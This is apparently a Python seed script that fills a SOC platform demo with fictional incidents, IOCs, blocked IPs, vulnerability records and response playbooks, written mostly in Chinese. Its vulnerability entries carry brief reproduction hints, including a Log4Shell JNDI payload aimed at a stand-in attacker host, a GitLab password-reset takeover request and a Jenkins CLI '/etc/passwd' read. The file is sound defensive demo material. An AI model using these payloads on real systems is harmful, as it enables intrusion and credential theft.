                "经分析 bash_history 与 auditd 日志，攻击者尝试拉取 /etc/shadow 失败，尝试访问内网 172.16.0.0/24 被堡垒机 ACL 阻断。",
            ),
        ],
    },
    {
        "key": "phishing",
        "title": "钓鱼邮件致财务人员凭据泄露与云控制台滥用",
        ...
        "comments": [
            (
                "admin",
                48,
                "已吊销 liu.yiming 全部会话令牌并强制重置密码 + 重注册 MFA；finance-readonly 的新增密钥已删除。",
            ),
            (
                "admin",
                46,
                "finance-exports 桶已恢复私有，CloudTrail 未发现批量 GetObject 下载记录，泄露影响待评估。",
            ),
        ],
    },
    {
        "key": "citrix-bleed",
        "title": "Citrix Gateway 内存泄露与未授权会话重放排查",
        ...
        "comments": [
            (
                "admin",
                9,
                "已下发 WAF 临时热补丁规则，拦截 URI 包含 /oauth/idp/.well-known/openid-configuration 的畸形请求。",
            ),
            (
                "admin",
                5,
                "与网络组确认今晚 23:00 安排双机热备轮流升级固件至安全版本，升级完成后将强制注销当前所有活跃 ICA 会话。",
            ),
        ],
    },
    {
        "key": "data-exfil",
        "title": "疑似敏感数据外发至个人网盘与 DNS 隐蔽信道",
        ...
        "comments": [
            (
                "admin",
                4,
                "已导出 DLP 命中明细与代理日志，等待 HR 确认 wang.xiaotong 近期离职意向。",
            ),
        ],
    },
    {
        "key": "audit-tampering",
        "title": "核心支付网关系统级审计守护进程（auditd）异常终止",
        ...
        "timeline": [
            (
                "status_change",
                "FIM 监控到安全敏感审计配置哈希不符，SOC 自动触发 P0 级工单",
                "audit-policy-01",
            ),
        ],
        "comments": [
            (
                "admin",
                1,
                "初步核实：运维团队未报备维护变更。建议立即提取该机器只读内存快照，并保留原始 syslog 远程日志。",
            ),
        ],
    },
    {
        "key": "mfa-fatigue",
        "title": "研发主管账号遭遇频繁多因素认证（MFA）疲劳轰炸攻击",
        ...
        "comments": [
            (
                "admin",
                13,
                "已与当事人电话确认，其并未主动发起登录。已要求当事人重置密码，并开启密码与设备绑定限制。",
            ),
        ],
    },
    {
        "key": "container-escape",
        "title": "Kubernetes 特权容器逃逸（runC CVE-2024-21626）行为阻断",
        ...
        "timeline": [
            (
                "status_change",
                "Falco 触发 Rule 'Kernel Workdir Fd Leak' 告警，自动隔离目标 Pod",
                "vuln-runc-01",
            ),
            (
                "resolution",
                "经分析为第三方依赖库内嵌测试 PoC 触发，宿主机未受实质影响；已全量升级 runc 并结案",
                None,
            ),
        ],
        "comments": [
            (
                "chen.hao",
                40,
                "排查该容器镜像来源为开发引入的非官方基础镜像，已清理仓库中所有同指纹镜像并加入黑名单。",
            ),
        ],
    },
    {
        "key": "usb-dlp-violation",
        "title": "研发终端违规插入移动介质与源码拷贝行为调查",
        ...
        "comments": [
            (
                "admin",
                6,
                "已调取该终端当日操作录屏与进程树，用户表示在家办公需要备份，需签署保密与合规自查承诺书。",
            ),
        ],
    },
    {
        "key": "macro-malware-edr",
        "title": "财务邮箱收到恶意宏 Office 附件被 EDR 驱动级拦截",
        ...
        "timeline": [
            (
                "status_change",
                "终端 EDR 隔离样本并上报至安全中心沙箱",
                "edr-quarantine-01",
            ),
            (
                "resolution",
                "沙箱动态分析完成，判定为已知 Emotet 家族变种，关联 IoC 已全局同步封禁，结案",
                None,
            ),
        ],
        "comments": [
            (
                "admin",
                80,
                "邮件网关已对相同特征发件人与主题进行全量回撤，共清理同类钓鱼邮件 8 封。",
            ),
        ],
    },
    {
        "key": "cloud-root-login",
        "title": "AWS 云平台 Root 根凭据境外控制台登录合规核查",
        ...
        "timeline": [
            (
                "status_change",
                "云合规卫士自动触发高危基线告警并通知安全值班群",
                "root-login-01",
            ),
            (
                "resolution",
                "核实为海外出差技术合伙人紧急处理账单异动，已当面要求封存 Root 凭据改用 IAM 权限，闭环结案",
                None,
            ),
        ],
        "comments": [
            (
                "admin",
                90,
                "已重新锁定 Root 账号访问密钥，并将紧急救援硬件 Ukey 放入保险柜物理保管。",
            ),
        ],
    },
    {
        "key": "ddos-rapid-reset",
        "title": "对外公共 API 网关 HTTP/2 Rapid Reset 流量突增处置",
        ...
        "timeline": [
            (
                "status_change",
                "网关连接数与错误率触发告警，流量自动牵引至高防清洗中心",
                "vuln-rapid-reset-01",
            ),
            (
                "resolution",
                "开启 WAF 畸形帧丢弃规则与客户端并发 RST 限速，网关指标已恢复正常，结案",
                None,
            ),
        ],
        "comments": [
            (
                "admin",
                65,
                "网关 Nginx 核心已在维护窗口完成补丁加固，抗重置攻击能力满足基线。",
            ),
        ],
    },
    {
        "key": "cryptomining",
        "title": "K8s 集群挖矿木马（XMRig）事件",
    ...
    },
    {
        ...
        "comments": [
            (
                "admin",
                6 * 24,
                "本周爆破源新增 2 个 IP，均已封禁。建议尽快关闭密码认证（跟踪单 TICK-4182）。",
            ),
        ],
    },
    {
        "key": "web-attack",
        "title": "Web 应用 SQL 注入与扫描探测",
    ...
    {
        "key": "log4j-remediation",
        "title": "Log4j2 远程代码执行漏洞历史资产全面清零专项",
        ...
        "timeline": [
            (
                "status_change",
                "扫描任务命中已弃用老旧服务节点组件，发起整改追踪单",
                "vuln-log4j-01",
            ),
            (
                "resolution",
                "组件全量升级至 Log4j 2.22 安全版本，重新复扫已通过，结案归档",
                None,
            ),
        ],
        "comments": [
            (
                "admin",
                220,
                "已同步更新 CI/CD 构建流水线中的安全检查插件，阻断不合规依赖包引入。",
            ),
        ],
    },
]
...
IOC_HITS: list[dict] = [
    ...
    (
        ...
        "alienvault-otx",
        "it-laptop-zhang",
        "Cobalt Strike C2 心跳目标，IT 运维终端外连",
        "已全网封禁，检索同类流量",
        25,
    ),
    (
        ...
        "abuseipdb",
        "jump-bastion-01",
        "SSH 暴力破解与 Log4Shell 利用来源，AbuseIPDB 置信度 100",
        "永久封禁",
        13 * 24,
    ),
    (
    ...
    (
        "ioc-7",
        "domain",
        "mail-verify-secure-login.com",
        92,
        "phishtank",
        "fin-laptop-liu",
        "仿冒 SSO 钓鱼域名（【发票异常】邮件主题）",
        "已提交 takedown",
        3 * 24,
    ),
    (
    ...
    (
        "ioc-12",
        "domain",
        "cdn-status-telegram.xyz",
        74,
        "alienvault-otx",
        None,
        "疑似 Cobalt Strike 备用 profile 域名",
        "全网 DNS 日志回溯 7 天",
        25,
    ),
    (
        "ioc-13",
        "url",
        "http://mail-verify-secure-login.com/sso/auth.html",
        92,
        "phishtank",
        "fin-laptop-liu",
        "钓鱼凭据收集页",
    ...
    (
        "ioc-14",
        "url",
        "http://update-cdn-service-cdn.xyz/init.sh",
        86,
        "internal-detection",
        "dev-jenkins-01",
        "cron 下载的恶意脚本 URL",
    ...
    (
        "ioc-17",
        "sha256",
        sha("ransomware-lockbit-variant-sample"),
        94,
        "internal-edr",
        "filesrv-01",
        "勒索信内嵌解密器样本（LockBit 3.0 变体）",
        "已提交沙箱：加密 + vssdel 行为",
        20,
    ),
    (
        "ioc-18",
        "sha256",
        sha("mimikatz-sample-dc-dc01"),
        91,
        "internal-edr",
        "dc-dc01",
        "rundll32 注入模块哈希（Mimikatz 特征）",
        "比对 VT 命中 58/70",
        24,
    ),
    (
        "ioc-19",
        "sha256",
        sha("encrypt_helper-binary"),
        89,
        "internal-edr",
        "filesrv-01",
        "PsExec 投递的 encrypt_helper.exe",
        "样本已隔离",
        22,
    ),
    (
        "ioc-20",
        "sha256",
        sha("kdevtmpfsi-xmrig-binary"),
        87,
        "internal-edr",
        "k8s-node-03",
        "XMRig 挖矿二进制 kdevtmpfsi",
        "已清理",
        5 * 24,
    ),
    (
        "ioc-21",
        "sha256",
        sha("fakeupdate-chrome-installer"),
        65,
        "virustotal",
        "hr-laptop-wang",
        "仿冒 Chrome 更新程序（Trojan:JS/FakeUpdate）",
        "EDR 自动隔离",
        90,
    ),
    (
...
BLOCKED_IPS: list[dict] = [
    ...
    (
        "45.155.205.233",
        "SSH 暴力破解 + Log4Shell 利用尝试（DEMO-BF-01 / DEMO-LOG4SHELL-01）",
        "manual",
        "bf-01",
        None,
        True,
    ...
    (
        "209.141.35.17",
        "Cobalt Strike C2 心跳目标（DEMO-C2-BEACON-01）",
        "manual",
        "c2-beacon-01",
        None,
        True,
    ...
    (
        "43.155.132.88",
        "钓鱼页宿主 / 异常云登录（DEMO-PHISH-CLICK-01）",
        "manual",
        "phish-click-01",
        None,
        True,
...
CORRELATED_EVENTS: list[dict] = [
    {
        ...
        "entities": {
            "source_ips": ["192.168.10.21", "209.141.35.17"],
            "users": ["zhang.wei", "svc_backup$"],
            "hosts": ["it-laptop-zhang", "dc-dc01", "filesrv-01"],
        },
        "first_h": 26,
        "last_h": 20,
        "status": "investigating",
        ...
        "assets": ["it-laptop-zhang", "dc-dc01", "filesrv-01"],
        "users": ["zhang.wei"],
        "impact": "财务共享目录 3,214 个文件被加密；若恢复失败预计影响月结流程 3-5 个工作日。",
    },
    {
        "key": "ce-phishing-cloud",
        "rule_id": "rule-account-takeover",
        ...
        "entities": {
            "source_ips": ["43.155.132.88"],
            "users": ["liu.yiming@acme-corp.cn"],
        },
        "first_h": 74,
        "last_h": 47,
        "status": "investigating",
        ...
        "assets": ["fin-laptop-liu"],
        "users": ["liu.yiming@acme-corp.cn"],
        "impact": "finance-exports 桶短暂公开约 40 分钟，暂未发现批量下载记录。",
    },
    {
        "key": "ce-bruteforce",
        "rule_id": "rule-bruteforce-cluster",
        ...
        "assets": ["jump-bastion-01", "vpn-gw-01"],
        "users": [],
        "impact": "无实际影响，管理面暴露面待收敛。",
    },
    {
        "key": "ce-cryptomining",
        "rule_id": "rule-crypto-mining",
        ...
        "entities": {
            ...
            "hosts": ["k8s-node-03", "dev-jenkins-01"],
        },
        "first_h": 122,
        "last_h": 120,
        "status": "resolved",
    ...
    },
    {
        ...
        "assets": ["web-prod-01", "web-prod-02", "dev-jenkins-01"],
        "users": [],
        "impact": "无。",
    },
    {
        ...
        "entities": {
            "source_ips": ["192.168.20.22", "192.168.10.21"],
            "users": ["wang.xiaotong@acme-corp.cn", "zhang.wei"],
        },
        "first_h": 33,
        "last_h": 3,
        "status": "open",
    ...
    {
        "key": "ce-vuln-exposure",
        "rule_id": "rule-critical-vuln-exposure",
        "title": "高危漏洞暴露面聚簇（堡垒机 / VPN / K8s）",
        "description": "Trivy 定时扫描发现三个边界高价值资产存在可被在野利用的漏洞。",
        "severity": "high",
        "attack_type": "vulnerability_exposure",
        "confidence": 0.98,
        "risk": 88.0,
        ...
        "assets": ["vpn-gw-01", "jump-bastion-01", "k8s-node-01"],
        "users": [],
        "impact": "边界设备若被利用可直接进入内网，影响面为全公司。",
    },
    {
        "key": "ce-noise-scan",
        "rule_id": "rule-scan-noise",
...
VULNERABILITIES: list[dict] = [
    {
        "cve": "CVE-2023-4966",
        "title": "Citrix Bleed — NetScaler ADC 会话令牌泄露",
        "description": "NetScaler ADC / Gateway 在特定配置下泄露有效会话令牌，攻击者可绕过 MFA 劫持 VPN 会话，已被多个勒索组织在野利用。",
        "severity": VulnerabilitySeverity.CRITICAL,
        "vtype": VulnerabilityType.AUTHENTICATION_BYPASS,
        "status": VulnerabilityStatus.IN_PROGRESS,
        "component": "NetScaler ADC",
        "version": "13.1-48.47",
        "vector": "网络（公网暴露的 VPN 网关）",
        "impact": "VPN 会话劫持 → 内网横向移动入口",
        "reproduce": "向 /oauth/idp/.well-known/openid-configuration 发送超长 Host 头并读取响应泄漏的会话令牌",
        "fix": "升级至 13.1-49.15+，升级后强制注销全部活动会话",
        "reporter": "trivy-scanner",
        "reported_h": 12,
        "cvss": 9.4,
        "triaged_h": 11,
        "in_progress_h": 10,
    ...
    {
        "cve": "CVE-2024-6387",
        "title": "regreSSHion — OpenSSH 信号处理竞态条件 RCE",
        "description": "OpenSSH 8.5p1-9.7p1 在 SIGALRM 处理中存在竞态条件，未认证远程代码执行。",
        "severity": VulnerabilitySeverity.HIGH,
        "vtype": VulnerabilityType.OTHER,
        "status": VulnerabilityStatus.TRIAGED,
        "component": "OpenSSH",
        "version": "9.2p1",
        "vector": "网络（SSH 22 端口公网可达）",
        "impact": "堡垒机被预认证 RCE 的理论路径",
        "reproduce": "高并发连接竞争 SIGALRM 窗口（平均需约 1 万次尝试）",
        "fix": "升级 OpenSSH 9.8p1+；临时缓解设置 LoginGraceTime=0",
        "reporter": "trivy-scanner",
        "reported_h": 30,
        "cvss": 8.1,
        "triaged_h": 28,
    ...
    {
        "cve": "CVE-2024-21626",
        "title": "runC 工作目录泄露导致容器逃逸",
        "description": "runc ≤1.1.11 的内部文件描述符泄露允许容器进程访问宿主机文件系统。",
        "severity": VulnerabilitySeverity.HIGH,
        "vtype": VulnerabilityType.OTHER,
        "status": VulnerabilityStatus.TRIAGED,
        "component": "runc / containerd",
        "version": "runc 1.1.10",
        "vector": "本地（需已具备构建/运行容器权限）",
        "impact": "预发节点容器逃逸",
        "reproduce": "以恶意 WORKDIR 构建镜像并运行",
        "fix": "随 K8s 1.29 升级 containerd 1.7.16+（runc 1.1.12）",
        "reporter": "trivy-scanner",
        "reported_h": 55,
        "cvss": 8.6,
        "triaged_h": 52,
    },
    {
        ...
        "version": "16.8.0",
        "vector": "网络（Web 接口）",
        "impact": "代码仓库最高权限丢失，CI/CD 供应链投毒",
        "reproduce": "POST /users/password 携带多个 user[email][] 参数",
        "fix": "升级至 GitLab 16.8.2 / 16.7.4 / 16.5.8 及以上版本",
        "reporter": "trivy-scanner",
        "reported_h": 16,
        "cvss": 10.0,
        "triaged_h": 15,
    ...
    {
        "cve": "CVE-2021-44228",
        "title": "Log4Shell — Apache Log4j2 JNDI 注入 RCE",
        "description": "log4j2 <2.15 的 JNDI lookup 特性允许未认证远程代码执行。",
        "severity": VulnerabilitySeverity.CRITICAL,
        "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
        "status": VulnerabilityStatus.CLOSED,
        "component": "log4j-core (Jenkins)",
        "version": "2.14.1",
        "vector": "网络（Jenkins 8080 研发网段）",
        "impact": "研发网段 RCE → 生产镜像投毒跳板",
        "reproduce": "User-Agent: ${jndi:ldap://attacker/exp}",
        "fix": "已升级 log4j 2.17.1；CI 加入 Trivy 门禁",
        "reporter": "trivy-scanner",
        "reported_h": 300,
        "cvss": 10.0,
        "triaged_h": 299,
    ...
    {
        "cve": "CVE-2022-22965",
        "title": "Spring4Shell — Spring MVC 数据绑定 RCE",
        ...
        "component": "Spring MVC (prod-user-service)",
        "version": "5.3.16",
        "vector": "网络",
        "impact": "—",
        "reproduce": "—",
        "fix": "误报：应用运行于 JDK 8，不满足利用条件；保留跟踪项作为证明",
        "reporter": "nmap-vuln-scan",
        "reported_h": 210,
        "cvss": 9.8,
        "triaged_h": 205,
        "closed_h": 200,
    ...
    {
        "cve": "CVE-2023-4911",
        "title": "Looney Tunables — Linux glibc 本地权限提升",
        ...
        "vector": "本地",
        "impact": "普通容器/本地受限账号提权至系统最高权限",
        "reproduce": "设置畸形 GLIBC_TUNABLES 参数执行 su 提权",
        "fix": "更新操作系统软件包 apt upgrade libc6",
        "reporter": "trivy-scanner",
        "reported_h": 35,
        "cvss": 7.8,
    },
    {
        ...
        "version": "2.441",
        "vector": "网络",
        "impact": "Jenkins 凭据库与加密密钥泄露",
        "reproduce": "使用 jenkins-cli.jar 发送 @/etc/passwd 读取请求",
        "fix": "升级 Jenkins 至 2.442+ 或 2.426.3 LTS+，或临时禁用 CLI 接入通道",
        "reporter": "trivy-scanner",
        "reported_h": 40,
        "cvss": 9.8,
    },
    ...
    {
        "cve": "CVE-2024-45519",
        "title": "Zimbra postjournal 远程命令执行",
        "description": "Zimbra Collaboration Suite postjournal 服务未充分校验收件人字段，可注入命令。",
        "severity": VulnerabilitySeverity.CRITICAL,
        "vtype": VulnerabilityType.OTHER,
        "status": VulnerabilityStatus.REPORTED,
        "component": "Zimbra (mail-exch-01)",
        "version": "9.0.0 P34",
        "vector": "网络（SMTP）",
        "impact": "邮件服务器 RCE",
        "reproduce": "—",
        "fix": "升级 P41+；临时关闭 postjournal",
        "reporter": "trivy-scanner",
        "reported_h": 8,
        "cvss": 9.8,
    },
...
PLAYBOOK_DEFS: list[dict] = [
    {
        ...
        "nodes": [
            ...
            },
            {
                ...
                "config": {
                    "method": "POST",
                    "url": "http://firewall-api.internal:8080/api/v1/rules/blacklist",
                    "timeout": 10,
                },
            },
            {
                ...
                "config": {
                    ...
                    "message": "钓鱼 IOC 已自动封禁: {{$.output.blocked}}",
                },
            },
        ],
        "edges": [
            {"source": "intake", "target": "ti_lookup"},
            {"source": "ti_lookup", "target": "decision"},
            {
                "source": "decision",
                "target": "block",
                "condition": "$.output.ti.malicious_count >= 2",
            },
            {
                "source": "decision",
                "target": "notify",
    ...
    },
    {
        ...
        "nodes": [
            ...
            },
            {
                ...
                "config": {
                    "method": "GET",
                    "url": "http://abuseipdb-proxy.internal:8090/check",
                    "params": {"ip": "{{$.output.iocs[0]}}"},
                    "timeout": 10,
                },
            },
            {
            ...
            },
            {
                ...
                "config": {
                    "method": "POST",
                    "url": "http://jump-bastion-01:8443/fail2ban/ban",
                    "timeout": 5,
                },
            },
            {
        ...
        "edges": [
            {"source": "intake", "target": "enrich"},
            {"source": "enrich", "target": "decision"},
            {
                "source": "decision",
                "target": "block",
                "condition": "$.output.abuse.confidence >= 80",
            },
            {
                "source": "decision",
                "target": "approve",
    ...
    },
    {
        ...
        "edges": [
            {"source": "intake", "target": "nvd"},
            {"source": "nvd", "target": "notify"},
        ],
    },
]
...
PLAYBOOK_RUN_SPECS: list[tuple] = [
    ...
    (
        ...
        [
            ...
            ("notify", "通知 SOC 群", "slack_webhook", 210, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知 SOC 群", "slack_webhook", 180, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            (
                ...
                "ti_lookup_otx",
                4500,
                "OTX API rate limit (429), retry exhausted",
            ),
    ...
    (
        ...
        [
            ...
            ("notify", "通知 SOC 群", "slack_webhook", 200, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知 SOC 群", "slack_webhook", 190, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("approve", "人工复核（可选）", "human_approval", 30000, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("approve", "人工复核（可选）", "human_approval", 28000, None),
        ],
        None,
    ),
    (
    ...
    (
        ...
        [
            ...
            ("approve", "人工复核（可选）", "human_approval", 26000, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知修复组", "slack_webhook", 170, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知修复组", "slack_webhook", 160, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知修复组", "slack_webhook", 0, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知修复组", "slack_webhook", 165, None),
        ],
        None,
    ),
    (
        ...
        [
            ...
            ("notify", "通知修复组", "slack_webhook", 158, None),
        ],
        None,
    ),
]
...
TRIGGER_INVOCATION_SPECS: list[tuple] = [
    ...
    (
        "inv-esg-1",
        "esg-phishing-webhook",
        "ph-1",
        2.5,
        "success",
        "idemp-esg-20260917-001",
        None,
    ),
    (
        "inv-esg-2",
    ...
    (
        ...
        9.5,
        "failed",
        "idemp-esg-20260916-003",
        "节点 ti_lookup 执行失败: OTX API rate limit (429)",
    ),
    (
        "inv-splunk-1",
        "splunk-ransomware-webhook",
        "ph-h1",
        30.0,
        "success",
        "idemp-splunk-20260915-001",
        None,
    ),
    (
        "inv-wazuh-1",
...
def build_playbook_runs() -> list[tuple[PlaybookRunModel, list[PlaybookRunStepModel]]]:
    ...
    for (
        ...
        step_specs,
        error,
    ) in PLAYBOOK_RUN_SPECS:
        started = ago(hours=started_h)
        finished = (
            None
            if status == "running"
            else started + timedelta(seconds=90 + int(started_h) % 7)
        )
        ...
        for idx, (sid, sname, stype, dur, serr) in enumerate(step_specs):
            ...
            step_finished = (
                None
                if s_status in ("running", "cancelled")
                else step_started + timedelta(milliseconds=dur)
            )
            steps.append(
                PlaybookRunStepModel(
                    ...
                    input_json={},
                    output_json={"ok": s_status == "success"},
                    error_text=serr,
                )
            )
        ...
        if kind == 0:  # Wazuh SSH 认证日志
            ...
            logs.append(
                SIEMLog(
                    ...
                    parsed_fields={
                        "demo": True,
                        "event": "cloud_api_call",
                        "user": u,
                        "src_ip": src_ip,
                        "action": "console_login" if i % 2 else "api_call",
                        "result": "success",
                    },
                )
            )
        ...
        rows.append(
            MonitorHistoryModel(
                ...
                avg_response_time_ms=round(
                    95 + 60 * math.sin(phase * 0.9) + (i % 7) * 4, 1
                ),
            )
        )
    return rows
...
async def reset_demo_data(session) -> dict:
    ...
    purged["alert_notes"] = await purge_rows(
        session, AlertNoteModel, AlertNoteModel.alert_id.in_(demo_alert_ids)
    )
    purged["case_alerts"] = await purge_rows(
        session, CaseAlertAssociation, CaseAlertAssociation.alert_id.in_(demo_alert_ids)
    )
    purged["case_alerts_by_case"] = await purge_rows(
        session, CaseAlertAssociation, CaseAlertAssociation.case_id.in_(demo_case_ids)
    )
    purged["case_timeline"] = await purge_rows(
        session, CaseTimelineEntry, CaseTimelineEntry.case_id.in_(demo_case_ids)
    )
    purged["case_comments"] = await purge_rows(
        session, CaseComment, CaseComment.case_id.in_(demo_case_ids)
    )
    purged["cases"] = await purge_rows(
        session, CaseModel, CaseModel.id.in_(demo_case_ids)
    )
    purged["security_alerts"] = await purge_rows(
        session,
        SecurityAlert,
        (SecurityAlert.external_event_id.like("DEMO-%"))
        | (SecurityAlert.external_event_id.like("test-%")),
    )

    purged["ioc_hits"] = await purge_rows(
        session, IOCHitDB, IOCHitDB.id.in_([uid("ioc", row[0]) for row in IOC_HITS])
    )
    purged["blocked_ips"] = await purge_rows(
        session,
        BlockedIP,
        BlockedIP.id.in_([uid("blocked", b[0]) for b in BLOCKED_IPS]),
    )
    purged["correlated_events"] = await purge_rows(
        session,
        CorrelatedEvent,
        CorrelatedEvent.id.in_([uid("ce", c["key"]) for c in CORRELATED_EVENTS]),
    )
    purged["siem_logs"] = await purge_rows(
        session, SIEMLog, SIEMLog.tenant_id == "default"
    )
    ...
    purged["trigger_invocations"] = await purge_rows(
        session, TriggerInvocationModel, TriggerInvocationModel.id.in_(demo_inv_ids)
    )
    purged["playbook_run_steps"] = await purge_rows(
        session, PlaybookRunStepModel, PlaybookRunStepModel.run_id.in_(run_ids)
    )
    purged["playbook_runs"] = await purge_rows(
        session, PlaybookRunModel, PlaybookRunModel.id.in_(run_ids)
    )
    purged["playbook_triggers"] = await purge_rows(
        session, PlaybookTriggerModel, PlaybookTriggerModel.id.in_(demo_trigger_ids)
    )
    purged["playbook_definitions"] = await purge_rows(
        session, PlaybookDefinitionModel, PlaybookDefinitionModel.id.in_(demo_pb_ids)
    )
    purged["assets"] = await purge_rows(
        session,
        AssetDB,
        (AssetDB.hostname.in_([a[0] for a in ASSETS]))
        | (AssetDB.notes.like("%演示数据%"))
        | (AssetDB.notes.like("%演练数据%"))
        | (AssetDB.ip.in_([a[1] for a in ASSETS])),
    )
    purged["vulnerabilities"] = await purge_rows(
        session,
        SecurityVulnerability,
        SecurityVulnerability.cve_id.in_([v["cve"] for v in VULNERABILITIES]),
    )
    ...
    purged["marketplace_playbooks"] = await purge_rows(
        ...
        MarketplacePlaybookModel.id.in_([pb["id"] for pb in OFFICIAL_PLAYBOOKS]),
    )
    await session.flush()
    ...
    if IS_POSTGRESQL:
        await session.execute(
            text(
                "SELECT setval('security_alerts_id_seq', (SELECT COALESCE(MAX(id), 0) + 1 FROM security_alerts), false);"
            )
        )
    return purged
...
async def seed(session) -> dict:
    ...
    for hostname, ip, owner, business, criticality, tags, notes in ASSETS:
        ...
        new_assets.append(
            AssetDB(
                ...
                tags=(
                    json.dumps([t.strip() for t in tags.split(",") if t.strip()])
                    if tags
                    else None
                ),
                notes=f"{notes}（演示数据）",
                is_active=True,
                created_at=ago(days=30).replace(tzinfo=None),
                updated_at=ago(days=30).replace(tzinfo=None),
            )
        )
    ...
    existing_events = set(
        (
            await session.scalars(
                select(SecurityAlert.external_event_id).where(
                    SecurityAlert.external_event_id.like("DEMO-%")
                )
            )
        ).all()
    ...
    all_demo_alerts = (
        await session.scalars(
            select(SecurityAlert).where(
                SecurityAlert.external_event_id.startswith("DEMO-")
            )
        )
    ).all()
    alerts_by_key = {
        a.external_event_id.removeprefix("DEMO-").lower(): a for a in all_demo_alerts
    }
    ...
    notes_spec = [
        (
            "c2-beacon-01",
            "admin",
            "已对 209.141.35.17 做全网流量回溯，近 7 天仅 it-laptop-zhang 一台主机外连，间隔 60±3s。",
        ),
        (
            "c2-beacon-01",
            "wang.fang",
            "JA3 指纹已归档，与 Cobalt Strike 默认 profile 匹配度 92%。",
        ),
        (
            "lsass-01",
            "admin",
            "svc_backup$ 账户已禁用；域管凭据轮换计划今晚 22:00 执行。",
        ),
        (
            "ransom-fim-01",
            "admin",
            "加密范围确认：/data/share 下 3,214 个文件 / 41 个目录；备份快照完好。",
        ),
        (
            "phish-email-01",
            "admin",
            "已通过 O365 撤回 9/12 封邮件，其余 3 封需终端侧清理。",
        ),
        (
            "ident-impossible-01",
            "admin",
            "新加坡会话 IP 43.155.132.88 与钓鱼页宿主一致，判定为同一攻击者。",
        ),
        ("bf-06", "admin", "Tor 出口节点，已对该 /24 段限速处理。"),
        (
            "vuln-citrix-01",
            "admin",
            "NetScaler 升级窗口已排期今晚 23:00，升级后强制注销全部会话。",
        ),
    ]
    new_notes = []
    existing_note_ids = set(
        (
            await session.scalars(
                select(AlertNoteModel.id).where(
                    AlertNoteModel.id.in_([uid("note", k, u) for k, u, _ in notes_spec])
                )
            )
        ).all()
    )
    ...
    for spec in CASES:
        ...
        session.add(
            CaseModel(
                ...
                resolved_at=(
                    ago(hours=spec["created_h"] - 2) if spec.get("resolved") else None
                ),
                closed_at=(
                    ago(hours=spec["created_h"] - 1) if spec.get("closed") else None
                ),
                created_at=created,
                updated_at=created,
            )
        ...
        for idx, key in enumerate(spec["alert_keys"]):
            ...
            session.add(
                CaseAlertAssociation(
                    case_id=case_id,
                    alert_id=alert.id,
                    added_at=created + timedelta(minutes=10 + idx),
                    added_by=ADMIN_ID,
                )
            )
            session.add(
                CaseTimelineEntry(
                    id=uid("tl", spec["key"], f"alert-{key}"),
                    case_id=case_id,
                    entry_type="alert",
                    summary=f"关联告警: {alert.title}",
                    source_alert_id=alert.id,
                    occurred_at=alert.created_at or created,
                )
            )
        ...
        for username, hours_ago, content in spec.get("comments", []):
            session.add(
                CaseComment(
                    id=uid("cm", spec["key"], username, str(hours_ago)),
                    case_id=case_id,
                    user_id=ADMIN_ID if username == "admin" else uid("user", username),
                    username=username,
                    content=content,
    ...
    existing_ioc_ids = set(
        (
            await session.scalars(
                select(IOCHitDB.id).where(
                    IOCHitDB.id.in_([uid("ioc", row[0]) for row in IOC_HITS])
                )
            )
        ).all()
    )
    ...
    for value, reason, source, alert_key, expires_days, active in BLOCKED_IPS:
        ...
        session.add(
            BlockedIP(
                ...
                expires_at=(
                    ago(days=-expires_days).replace(tzinfo=None)
                    if expires_days
                    else None
                ),
                is_active=active,
                created_at=ago(days=1).replace(tzinfo=None),
                updated_at=ago(days=1).replace(tzinfo=None),
    ...
    for spec in CORRELATED_EVENTS:
        ...
        session.add(
            CorrelatedEvent(
                ...
                raw_event_ids=alert_ids,
                raw_event_count=len(alert_ids),
                ...
                ai_remediation=spec["remediation"],
                risk_score=spec["risk"],
                affected_assets=spec["assets"],
                affected_users=spec["users"],
    ...
    existing_siem = await session.scalar(
        select(func.count())
        .select_from(SIEMLog)
        .where(SIEMLog.id == uid("siem", "auth-0"))
    )
    ...
    for t_spec in TRIGGERS:
        ...
        session.add(
            PlaybookTriggerModel(
                ...
                last_triggered_at=(
                    ago(hours=t_spec["last_triggered_h"])
                    if t_spec.get("last_triggered_h")
                    else None
                ),
    ...
    for v in VULNERABILITIES:
        ...
        session.add(
            SecurityVulnerability(
                ...
                severity=v["severity"],
                vulnerability_type=v["vtype"],
                status=v["status"],
                affected_component=v["component"],
                affected_version=v["version"],
                attack_vector=v["vector"],
                impact=v["impact"],
                reproduction_steps=v["reproduce"],
                fix_recommendation=v["fix"],
                reporter=v["reporter"],
                reported_at=ago(hours=v["reported_h"]),
                triaged_at=ago(hours=v["triaged_h"]) if v.get("triaged_h") else None,
                in_progress_at=(
                    ago(hours=v["in_progress_h"]) if v.get("in_progress_h") else None
                ),
                ...
                assigned_to=(
                    "admin"
                    if v["status"]
                    in (VulnerabilityStatus.IN_PROGRESS, VulnerabilityStatus.TRIAGED)
                    else None
                ),
...
async def main() -> None:
    ...
    parser.add_argument(
        "--reset", action="store_true", help="清除已有种子数据后重新插入"
    )
